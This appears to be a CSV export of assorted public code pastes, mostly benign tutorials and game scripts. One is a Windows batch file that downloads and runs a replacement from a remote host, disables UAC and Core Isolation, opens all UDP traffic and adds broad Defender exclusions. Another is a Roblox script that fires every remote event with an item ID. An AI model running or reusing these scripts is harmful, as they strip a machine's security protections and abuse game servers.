id,title,username,language,date,content
EWmSNUqY,asset_get_list_array,plonp,Game Maker,Wednesday 6th of September 2023 07:04:42 PM CDT,"function asset_get_list_array(type, _prefix = """") {
	//REF: https://manual.yoyogames.com/GameMaker_Language/GML_Reference/Asset_Management/Assets_And_Tags/asset_add_tags.htm
	var _arr = [], i = 0;

	switch (type) {
		default: return undefined;
		case asset_sprite:
			while sprite_exists(i) {
				var name = sprite_get_name(i);
				if string_copy(name, 1, string_length(_prefix)) == _prefix {_arr[i] = name;}
				i++;
			}
			break;
		case asset_object:
			while instance_exists(i) {
				var name = object_get_name(i);
				if string_copy(name, 1, string_length(_prefix)) == _prefix {_arr[i] = name;}
				i++;
			}
			break;
	}

	return _arr;
}"
82tfkwQ3,FeaturesDisable.bat,f3l1p1nh07,Batch,Wednesday 6th of September 2023 06:45:49 PM CDT,"@echo off

:: Define a versão local
setlocal enabledelayedexpansion
set FileVersion=1.0

:: URL para baixar o script de atualização
set ""UPDATE_URL=https://clutch.paxe.at/HelperBats/Features/FeaturesDisable.bat""

:: Baixa o script de atualização no mesmo diretório que o script em execução
curl -o ""%~dp0temp_script.bat"" %UPDATE_URL% 2>nul

:: Verifica se o download foi bem-sucedido
if %errorlevel% neq 0 (
    echo Falha ao baixar o script de atualização. Por favor, abra um chamado no Discord da Clutch-Solution.
    pause
    exit /b 1
)

:: Obtém a versão do script remoto (assumindo que a versão é definida como ""FileVersion=X.Y"")
for /f ""tokens=2 delims=="" %%i in ('findstr ""FileVersion="" ""%~dp0temp_script.bat""') do set remote_version=%%i

:: Verifica se a versão remota é maior que a versão local
if ""!remote_version!"" gtr ""!FileVersion!"" (
    echo ATENÇÃO: Nova atualização disponível e choice /C YN /M ""Deseja atualizar seus arquivos (Altamente recomendado)""
    if errorlevel 2 (
        echo Você optou por não atualizar.
    ) else (
        echo Iniciando a atualização...

        :: Substitui o script local pelo script de atualização
        move /y ""%~dp0temp_script.bat"" ""%~dpnx0""

        echo Atualização concluída.

        :: Reinicia o script com a versão atualizada
        start ""Script Atualizado"" ""%~dpnx0""
        exit /b 0
    )
) else (
    echo Você já possui a versão mais recente.
    timeout /t 1 > nul
    goto Main
)

:Main
:LegacyTerminal
::Change Windows Terminal To Windows Console Host
REG ADD ""HKEY_CURRENT_USER\Console\%%%%Startup"" /V DelegationConsole /T REG_SZ /D {B23D10C0-E52E-411E-9D5B-C09FDF709C7D} /F
REG ADD ""HKEY_CURRENT_USER\Console\%%%%Startup"" /V DelegationTerminal /T REG_SZ /D {B23D10C0-E52E-411E-9D5B-C09FDF709C7D} /F

:VpsFPS
::Force RDP Using 30 FPS
REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations"" /V DWMFRAMEINTERVAL /T REG_dWORD /D 8 /F

:DisableUAC
::Disable UAC Notification
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /V EnableLUA /T REG_DWORD /D 0 /F

:DisableFastStartup
::Disable Fast Startup
REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power"" /V HiberbootEnabled /T REG_dWORD /D 0 /F

:DisableCoreIso
::Disable Core Isolation
REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /V Enabled /T REG_dWORD /D 0 /F

:FirewallRules 
::Disable All Firewall Profiles
netsh advfirewall firewall delete rule name=""Allow All UDP Traffic"" ::Avoid duplicate
netsh advfirewall firewall add rule name=""Allow All UDP Traffic"" protocol=UDP dir=in action=allow ::IN
netsh advfirewall firewall add rule name=""Allow All UDP Traffic"" protocol=UDP dir=out action=allow ::OUT
cls

:IPv6Prompt
::Prompt IPV6
echo You don't know what IPv6 is? Type ""Y"".

set /p PromptIpv6=Disable IPv6? [Y/N]:
if %PromptIpv6%==Y goto DisableIPv6
if %PromptIpv6%==y goto DisableIPv6
if %PromptIpv6%==N goto VcRedistInstall
if %PromptIpv6%==n goto VcRedistInstall
goto IPv6Prompt

:DisableIPv6
::Disable IPv6 On All Adapters
powershell.exe Disable-NetAdapterBinding -Name '*' -ComponentID 'ms_tcpip6'

:VcRedistInstall
::VcRedistInstall
cls
echo Downloading vcredist...
curl -s --location --request GET ""https://aka.ms/vs/16/release/vc_redist.x64.exe"" --output vcredist.exe
echo Installing vcredist...
start vcredist.exe /Q

:DisableDefenderControl
::Disable Defender Control
powershell.exe Add-MpPreference -ExclusionExtension ""dll"" -Force
timeout /t 2 >nul
powershell.exe Add-MpPreference -ExclusionExtension ""zip"" -Force
timeout /t 2 >nul
powershell.exe Add-MpPreference -ExclusionExtension ""exe"" -Force
timeout /t 2 >nul
powershell.exe Add-MpPreference -ExclusionPath %~dp0 -Force
timeout /t 2 >nul
::curl -s --location --request GET ""https://github.com/ionuttbara/windows-defender-remover/releases/download/release_def_12_5_4/DefenderRemover.exe"" --output defender.exe

WinRestartPrompt
Prompt Windows Restart
shutdown /r /f /t 30 /c ""The computer will restart in 30 seconds, you can restart it earlier if you want""

del %~dpnx0"
n5cZGBbr,Fire prompt using ID,_Goofy,Lua,Wednesday 6th of September 2023 06:42:17 PM CDT,"local id  = 14631334907 -- Put the id item here

-- this script below will fire all remotes in the game with the id as an argument
for i,v in pairs(game:GetDescendants()) do
if v:IsA(""RemoteEvent"") then
v:FireServer(id)
if v:IsA(""BindableEvent"") then
v:Fire(id)
if v:IsA(""RemoteFunction"") then
v:InvokeServer(id)
end
end
end
end"
d38YTrMU,Mr Python Wiz Chatbot,here2share,Python,Wednesday 6th of September 2023 06:37:20 PM CDT,"Mr Python Wiz Chatbot

Act like you are a genius Python programmer named of Mr Wiz always determined to write complete code, even to add more to it... and will always attempt to find a solution to what might seem impossible when asked to do so. You will keep listing 10 or more different solutions of what you think are the best solutions sorted by most recommended to the least recommended, especially if the user enters only a ""///"", and that list must be numbered whereas all the user has to do is type that number for it to be implemented... and if there is a ""?"" beside that number, that means to further elaborate on that option. You will never try to implement Numpy, Pandas, Tensorflow... or any other import that requires sis. 

c/ - means continue
d/ - delete your most recent reply from your memory"
HTFaT7ji,pymysql,teslariu,Python,Wednesday 6th of September 2023 06:33:29 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Script que se conecta a una base MySQL
# instalar previamente pymysql: pip install pymysql

import pymysql

conn = pymysql.connect(
		host = ""localhost"",
		user = ""root"",
		port = 3306,
		passwd = """",
		db = ""comercioit""
		)
		
cursor = conn.cursor()


cursor.execute(""SELECT * FROM productos"")
datos = cursor.fetchall()
print(datos)

# cerrar la base
conn.close()









"
7eCnkSNq,ejercicio sqlite,teslariu,Python,Wednesday 6th of September 2023 06:23:08 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import sqlite3

conn = sqlite3.connect(""productos.sqlite"")
cursor = conn.cursor()

cursor.execute(""CREATE TABLE IF NOT EXISTS productos(id NUMERIC, nombre TEXT, precio NUMERIC)"")

conn.commit()


productos = (
		(1,'Teclado',25),
		(2,""Mouse"", 18),
		(3,'Monitor',300),
		(4,'Parlantes',100)
)

for cod,nombre,precio in productos:
	cursor.execute(f""INSERT INTO productos VALUES(?,?,?)"",(cod,nombre,precio))
	
conn.commit()

cursor.execute(""SELECT * FROM productos"")
datos = cursor.fetchall()
print(datos)

# cerrar la base
conn.close()









"
WSZgRVeE,ComputerCraft mining script 1.6.4,UnicorNora,Lua,Wednesday 6th of September 2023 06:12:51 PM CDT,"--[[
Version
  0.07 1/2/2015 1:41 PM
Changelog
  0.01 - Starting Of Rewriting
  0.02 - More Writing
  0.03 - Adding Fuel Code
  0.04 - Small but many program error fixed
  0.05 - Fully Test
  0.06 - Fixing Minor Bug when add 3 to deep because firstdig had no 3 add to deepcount
  0.07 - Fixing High Error
--]]

-- Local Variables
-- Starting
local wide = 0
local wideCount = 0
local long = 0
local longCount = 0
local deep = 0
local deepCount = 0
local totalBlocks = 0
local coalNeeded = 0
local corrent = n
-- Inventory This Will Check At Start Code
local chest = 0
local fuelCount = 0
local fuelCount1 = 0
local noFuelNeed = 0 -- if Config has fuel no need on
local error = 0 -- Error Code
local reCheck = 0 -- Recheck Code
-- Others
local totalBlocks = 0
local totalBlockDone = 0 -- How many Block Mined
local LSorWS = 0 -- Go Left or Go Right This is for Wide Code
local ALorAR = 0 -- align left Or align Right
local processRaw = 0
local process = 0
local enderChest = 0 -- TODO
local blockUp = 0 -- Fixing to Chest Probleem and moving probleem
local processRaw = 0
local process = 0

-- Checking
local function check()
    if noFuelNeed == 0 then
        if fuelCount == 0 then
            print(""Turtle has no fuel"")
            print(""Put fuel in Second and Thrid slot"")
            error = 1
        else
            print(""Turtle has Fuel"")
        end
        if fuelCount1 == 0 then
            print(""Turtle has no extra fuel but if is short job it okey"")
        end
    end
    if chest == 0 then
        print(""No chest in Turtle"")
        print(""Put chest in 1 slot"")
        error = 1
    else
        print(""Turtle has chest"")
    end
    if error == 1 then
        print(""Items are missing please try again"")
        print(""Turtle will recheck in 8 sec"")
    end
end

-- Recheck if user forget something turtle will check after 6 sec
local function reCheck()
    chest = turtle.getItemCount(1)
    fuelCount = turtle.getItemCount(2)
    fuelCount1 = turtle.getItemCount(3)
    error = 0
end

local function chestDump()
    if turtle.getItemCount(16)> 0 then -- If slot 16 in turtle has item slot 4 to 16 will go to chest
    repeat -- The Fix to Gravel Chest Bug. It check if gravel above then it dig till it gone
        turtle.digUp()
        sleep(0.6)
        if turtle.detectUp() then
            turtle.digUp()
            blockUp = 1
        else
            blockUp = 0
        end
    until blockUp == 0
    turtle.select(1)
    turtle.placeUp()
    chest = chest - 1
    for slot = 4, 16 do
        turtle.select(slot)
        sleep(0.6) -- Small fix for slow pc because i had people problem with this
        turtle.dropUp()
    end
    turtle.select(1)
	turtle.digUp()
    turtle.select(4)
    if Chest == 0 then
        print(""Out Of Chest"")
        os.shutdown()
    end
    end
end

-- Refuel
local function refuel()
    if noFuelNeed == 0 then
        repeat
            if turtle.getFuelLevel() < 160 then
                if fuelCount > 0 then
                    turtle.select(2)
                    turtle.refuel(1)
                    fuelCount = fuelCount - 1
                elseif fuelCount1 > 0 then
                    turtle.select(3)
                    turtle.refuel(1)
                    fuelCount1 = fuelCount1 - 1
                else
                    print(""out of fuel"")
                    os.shutdown()
                end
            end
        until turtle.getFuelLevel() >= 160
    end
end

local function mineLong()
    if turtle.detect() then
        turtle.dig()
    end
    if turtle.forward() then
        longCount = longCount + 1
    else
        repeat
            turtle.dig()
            sleep(0.6)
            if turtle.forward() then
                blockUp = 0
            else
                blockUp = 1
            end
        until blockUp == 0
        longCount = longCount + 1
        print(totalBlocks - totalBlockDone)
    end
    if turtle.detectUp() then
        turtle.digUp()
    end
    if turtle.detectDown() then
        turtle.digDown()
    end
    totalBlockDone = totalBlockDone + 3
end

local function wideMineLeft() -- TODO
    turtle.turnLeft()
    if turtle.detect() then
        turtle.dig()
        sleep(0.6) -- Minor bug fix if there is gravel
    end
    if turtle.forward() then
        --notting
    else
        repeat
            turtle.dig()
            sleep(0.6)
            if turtle.forward() then
                blockUp = 0
            else
                blockUp = 1
            end
        until blockUp == 0
    end
    if turtle.detectUp() then
        turtle.digUp()
    end
    if turtle.detectDown() then
        turtle.digDown()
    end
    turtle.turnLeft()
    LSorWS = 0
    longCount = 0
    wideCount = wideCount + 1
    totalBlockDone = totalBlockDone + 3
    end

local function wideMineRight() -- TODO
    turtle.turnRight()
    if turtle.detect() then
        turtle.dig()
        sleep(0.6)
    end
    if turtle.forward() then
        --Notting
    else
        repeat
            turtle.dig()
            sleep(0.6)
            if turtle.forward() then
                blockUp = 0
            else
                blockUp = 1
            end
        until blockUp == 0
    end
    if turtle.detectUp() then
        turtle.digUp()
    end
    if turtle.detectDown() then
        turtle.digDown()
    end
    turtle.turnRight()
    LSorWS = 1
    longCount = 0
    wideCount = wideCount + 1
    totalBlockDone = totalBlockDone + 3
end

local function deepMine()
    turtle.digDown()
    turtle.down()
    turtle.digDown()
    turtle.down()
    turtle.digDown()
    turtle.down()
    turtle.digDown()
    turtle.turnRight()
    turtle.turnRight()
    wideCount = 0
    longCount = 0
    deepCount = deepCount + 3
    totalBlockDone = totalBlockDone + 3
end

local function main()
    repeat --Repeat for each level
        mineLong()
        refuel()
        chestDump()
        if longCount == long then
            if wideCount ~= wide then
                process = totalBlockDone / totalBlocks * 100
                processRaw = totalBlocks - totalBlockDone
                print(""How Much Is Done: "" .. math.floor(process+0.5) .. "" %"")
                print(""TotalBlocks Still Need To Dig Is "" .. processRaw)
                if LSorWS == 0 then
                    wideMineRight()
                else
                    wideMineLeft()
                end
            elseif wideCount >= wide then
                    deepMine()
            end
        end
    until deepCount >= deep
    print(""turtle is Done"")
end

local function firstDig()
    turtle.digDown()
    turtle.down()
    turtle.digDown()
    turtle.down()
    turtle.digDown()
    wideCount = 0
    longCount = 0
    totalBlockDone = totalBlockDone + 3
end

local function start()
    print(""Welcome To Excavation Turtle Program"")
    print(""Slot 1: Chest, Slot 2: Fuel, Slot 3: Fuel"")
    print(""Note: If now put item in then it say error just wait it fix it self"")
    print(""How long(Lenght) you want"")
    input = io.read()
    long = tonumber(input)
    long = long - 1
    print(""How wide(Width) you want"")
    input2 = io.read()
    wide = tonumber(input2)
    wide = wide - 1
    print(""How Deep(Depth) You Want"")
    input3 = io.read()
    deep = tonumber(input3)
    print(""Is This Corrent Lenght "" .. ""Lenght = "" .. (long + 1) .. "" Width = "" .. (wide + 1) .. "" Depth = "" .. (deep))
    print(""Type y Or Y if it is correct and if not then n or N"")
    corrent = io.read()
    if corrent == n or N then
        os.reboot()
    end
    print(""Okey Program Will Do Calculations"")
    totalBlocks = (wide + 1) * (long + 1) * deep -- 1 is add because above it removed for wide and long code
    print(""Total amount for block to mine is "" .. totalBlocks)
    coalNeeded = totalBlocks / 3 / 80
    print(""Total amount for Coal needed is "" .. math.floor(coalNeeded+0.5))
    if turtle.getFuelLevel() == ""unlimited"" then
        print(""Your turtle config does need fuel"")
        noFuelNeed = 1
    elseif turtle.getFuelLevel() < 160 then
        turtle.select(2)
        turtle.refuel(2)
    end
    reCheck()
    check()
    if error == 1 then
        repeat
            sleep(6)
            reCheck()
            check()
        until error == 0
    end
    print(""Turtle will now start!"")
    firstDig()
    main()
end

start()"
92AqbAv9,sqlite,teslariu,Python,Wednesday 6th of September 2023 05:36:02 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
""""""
Motores de bases de datos:
SQLite: el único incorporado a la biblioteca std: import sqlite3

MySQL (y MariaDB): mysql-connector-python, PyMySQL, MYSQLdb
PostgreSQL: psycopg, pg8000

SQL Server: pymssql, pyodbc
Oracle: cx_Oracle
""""""
import sqlite3

# Me conecto a una base de datos. Si la base no existe, la crea.
conn = sqlite3.connect(""mibase.sqlite"")

# creo el cursor para hacer consultas SQL
cursor = conn.cursor()

# Creo la primer consulta: crear una tabla
cursor.execute(""CREATE TABLE IF NOT EXISTS personas(nombre TEXT, edad NUMERIC)"")

# como acabo de modificar la estructura de la base de datos creando una 
# tabla, debo hacer un commit
conn.commit()

# agrego datos a la tabla personas
personas = (
		('Pablo',22),
		(""Ana"", 34),
		('Luisa',28),
		('Carlos',45)
)

for nombre,edad in personas:
	cursor.execute(f""INSERT INTO personas VALUES(?,?)"",(nombre,edad))
	
conn.commit()

# voy a pedir los datos y los imprimo por consola
cursor.execute(""SELECT * FROM personas"")
datos = cursor.fetchall()
print(datos)

# cierro la base de datos
conn.close()








"
qwrx3ss5,esk,paulandzen,Python,Wednesday 6th of September 2023 05:35:25 PM CDT,"person|lookup:'Skin Condition' = 'Rosacea' or person|lookup:'Skin Type' = 'Rosacea' or person|lookup:'Rosacea' = 'Yes' or person|lookup:'Rosacea' = 'yes' or person|lookup:'Rosacea' = 1

""Pregnancy"" in person|lookup:'Skin Type'

""I would like to have less"" in person|lookup:""Pigmentation"" or ""Primary concern"" in person|lookup:""Pigmentation"" or ""Primary Concern"" in person|lookup:""Pigmentation""

""I would like to have less"" in person|lookup:""Finelines"" or ""Primary concern"" in person|lookup:""Finelines"" or ""Primary Concern"" in person|lookup:""Finelines""

""I would like to have less"" in person|lookup:""Acne"" or ""Primary concern"" in person|lookup:""Acne"" or ""Primary Concern"" in person|lookup:""Acne""


person|lookup:'Skin Condition' = 'Rosacea' or person|lookup:'Skin Type' = 'Rosacea' or person|lookup:'Rosacea' = 'Yes' or person|lookup:'Rosacea' = 'yes' or person|lookup:'Rosacea' = 1 or ""I would like to have less"" in person|lookup:""Pigmentation"" or ""Primary concern"" in person|lookup:""Pigmentation"" or ""Primary Concern"" in person|lookup:""Pigmentation"" or ""I would like to have less"" in person|lookup:""Finelines"" or ""Primary concern"" in person|lookup:""Finelines"" or ""Primary Concern"" in person|lookup:""Finelines"" or ""I would like to have less"" in person|lookup:""Acne"" or ""Primary concern"" in person|lookup:""Acne"" or ""Primary Concern"" in person|lookup:""Acne""


person|lookup:'Submitted Quiz - marketing approved' != 'Yes' or not person|lookup:'Submitted Quiz - marketing approved'
"
cmDErV8t,Untitled,Nenogzar,Python,Wednesday 6th of September 2023 05:24:37 PM CDT,"flower_type = input()
flower_count = int(input())
budget = int(input())

# Изчисляване на крайната цена
if flower_type == ""Roses"":
    price_per_flower = 5.00
    if flower_count > 80:
        price_per_flower *= 0.90  # 10% отстъпка
elif flower_type == ""Dahlias"":
    price_per_flower = 3.80
    if flower_count > 90:
        price_per_flower *= 0.85  # 15% отстъпка
elif flower_type == ""Tulips"":
    price_per_flower = 2.80
    if flower_count > 80:
        price_per_flower *= 0.85  # 15% отстъпка
elif flower_type == ""Narcissus"":
    price_per_flower = 3.00
    if flower_count < 120:
        price_per_flower *= 1.15  # 15% наценка
elif flower_type == ""Gladiolus"":
    price_per_flower = 2.50
    if flower_count < 80:
        price_per_flower *= 1.20  # 20% наценка

total_price = flower_count * price_per_flower

# Проверка дали бюджетът е достатъчен
if budget >= total_price:
    remaining_budget = budget - total_price
    print(f""Hey, you have a great garden with {flower_count} {flower_type} and {remaining_budget:.2f} leva left."")
else:
    needed_budget = total_price - budget
    print(f""Not enough money, you need {needed_budget:.2f} leva more."")"
